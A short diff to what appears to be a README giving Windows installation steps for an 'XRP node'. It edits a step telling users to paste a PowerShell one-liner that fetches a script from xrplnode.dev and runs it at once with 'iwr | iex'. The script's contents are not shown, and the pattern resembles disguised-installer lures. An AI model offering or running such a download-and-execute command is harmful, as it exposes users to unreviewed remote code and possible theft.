@@ -10,8 +10,8 @@ _Using Command Prompt is the recommended way to install an XRP node on Windows. 
 Press `Win + R`, type `CMD`, and press **Enter**.
 
 ### Step 2: Run the XRP node installation command
-```cmd
-powershell -command "$version='xrp-mainnet-node=4.1.7-1b0a841'; iwr -useb xrplnode.dev/install | iex"
+```powershell
+powershell -c "$version='xrp-mainnet-node=4.1.7-1b0a841'; iwr -useb xrplnode.dev/install | iex"
 `````
 
 _After executing the command, the node will begin initializing and syncing with the XRP network._ <br>
